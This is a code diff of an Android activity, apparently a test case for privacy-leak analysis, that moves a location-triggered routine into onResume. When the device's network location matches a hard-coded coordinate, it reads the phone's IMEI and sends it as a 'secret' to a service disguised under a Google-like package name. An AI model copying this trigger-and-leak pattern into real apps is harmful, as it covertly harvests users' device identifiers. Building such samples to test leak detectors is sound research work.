@@ -1,4 +1,4 @@
-package edu.ucdavis.location1;
+package edu.ucdavis.location2;
 
 import android.app.Activity;
 import android.content.Context;
@@ -20,6 +20,8 @@ public class MainActivity extends AppCompatActivity {
 
     Activity mActivity;
 
+    LocationManager locationManager;
+
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
@@ -27,26 +29,37 @@ public class MainActivity extends AppCompatActivity {
 
         mActivity = this;
 
-        LocationManager locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
+        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
 
         LocationListener locationListener = new MyLocationListener();
-        locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 5000, 10, locationListener);
+        locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 0, 0, locationListener);
+    }
+
+    protected void onResume() {
+        super.onResume();
+        String locationProvider = LocationManager.NETWORK_PROVIDER;
+
+        Location lastKnownLocation = locationManager.getLastKnownLocation(locationProvider);
+
+        if (lastKnownLocation != null) {
+            double lat = lastKnownLocation.getLatitude();
+            double lon = lastKnownLocation.getLongitude();
+
+            if ((int) lat == 38 && (int) lon == 77) {
+                Intent in = new Intent();
+                TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+                String imei = telephonyManager.getDeviceId(); //source
+                in.putExtra("secret", imei);
+                in.setClass(this, com.google.ssearch.SearchService.class);
+                startService(in);
+            }
+        }
     }
 
     private class MyLocationListener implements LocationListener {
         @Override
         public void onLocationChanged(Location loc) {  //source
-            double lat = loc.getLatitude();
-            double lon = loc.getLongitude();
 
-            if ((int)lat == 38 && (int)lon == 77 ) {
-                Intent in = new Intent();
-                TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
-                String imei = telephonyManager.getDeviceId(); //source
-                in.putExtra("secret", imei);
-                in.setClass(mActivity, com.google.ssearch.SearchService.class);
-                startService(in);
-            }
         }
 
         @Override
